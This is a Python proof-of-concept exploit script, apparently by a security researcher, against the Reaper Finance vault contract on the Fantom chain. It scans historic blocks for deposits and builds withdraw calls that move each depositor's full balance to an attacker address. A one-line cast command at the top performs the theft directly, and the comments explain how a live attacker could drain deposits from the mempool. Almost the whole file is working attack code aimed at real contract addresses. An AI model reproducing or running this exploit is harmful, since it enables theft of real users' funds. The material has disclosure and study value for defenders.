##
# Demonstration exploit for Reaper Finance
# For this example we parse previous transaction data from historic block states
# to find the deposit address/amounts. (very slowly / ineffeciently)
#
# if this were a live attack an attacker could swap this logic with a filter for latest blocks
# to catch depositors in the mempool to instantly drain the accounts upon deposit.
#
# protip dont waste time trying to read the storage of a mapping for token balances at a
# specific block height when you could just check the tokens transfers page
# https://ftmscan.com/token/0x77dc33dc0278d21398cb9b16cbff99c1b712a87a
#
# Exploit with cast in 1 line/call:
# 
# cast call --rpc-url $RPC --block 44000000 $REAPER "withdraw(uint256, address, address)" 272475965085592826065349 $HACKER 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b | cast 2d
# 271409956467569828086240
#
# LCFR.eth
##

import json
from eth_account import Account
from eth_account.signers.local import LocalAccount
from concurrent.futures import ThreadPoolExecutor
from web3 import Web3, HTTPProvider


class rekt:
    def __init__(self):
        self.provider = "https://rpcapi.fantom.network/"
        self.w3 = Web3(HTTPProvider(self.provider))

        #self.pkey = os.getenv("PKEY")
        #self.ETH_ACCOUNT: LocalAccount = Account.from_key(self.pkey)

        self.reaper_addr = "0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A"
        self.reaper = self.w3.eth.contract(address=self.reaper_addr, abi=json.loads(open('reaperabi.json', 'r').read()))
        self.block = 43000000  # first deposit added
        return

    def sendit(self, calldata):
        nonce = self.w3.eth.getTransactionCount(self.ETH_ACCOUNT.address)
        tx = {
            'chainId': 250,
            'from': self.ETH_ACCOUNT.address,
            'to': self.reaper_addr,
            'nonce': nonce + 1,
            'gas': 2500000, # should be enough gas to wreckit.
            'data': calldata
        }

        signed_tx = self.w3.eth.account.sign_transaction(tx, self.pkey)
        send_tx = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print("[+] tx hash %s " % self.w3.toHex(send_tx))
        self.w3.eth.wait_for_transaction_receipt(send_tx)
        print("[+] tx mined")

    def caseIt(self, block):
        blocktxs = self.w3.eth.get_block(block, full_transactions=True)
        for tx in blocktxs["transactions"]:
            if tx['to'] == self.reaper_addr:
                print(tx)
                self.getBags(tx)


    def getBags(self, tx):
        #print(tx)
        params = self.reaper.decode_function_input(tx["input"])
        deposit = '0x6e553f65'
        attacker = self.w3.toChecksumAddress("0x328eBc7bb2ca4Bf4216863042a960E3C64Ed4c10")

        if tx["input"][0:10] == deposit:
            sender = tx["from"]
            assets = params[1]["assets"]
            receiver = params[1]["receiver"]

            maxwithdraw = self.reaper.functions.maxWithdraw(sender).call()

            print(f"sender: {sender}")
            print(f"receiver: {receiver}")
            print(f"assets: {assets}")
            print(f"max: {maxwithdraw}")

            # function withdraw(uint256 assets, address receiver, address owner) external nonReentrant returns (uint256 shares)
            withdraw = self.reaper.encodeABI(fn_name="withdraw", args=[maxwithdraw, attacker, sender])
            print(f"calldata: {withdraw}")
            #self.sendit(withdraw)
            return

    def main(self):
        print("[+] Sowed")

        goodTimes = [*range(42161631, 44000000)]

        with ThreadPoolExecutor() as executor:
            futures = executor.map(self.caseIt, goodTimes)

if __name__ == '__main__':
    main = rekt()
    main.main()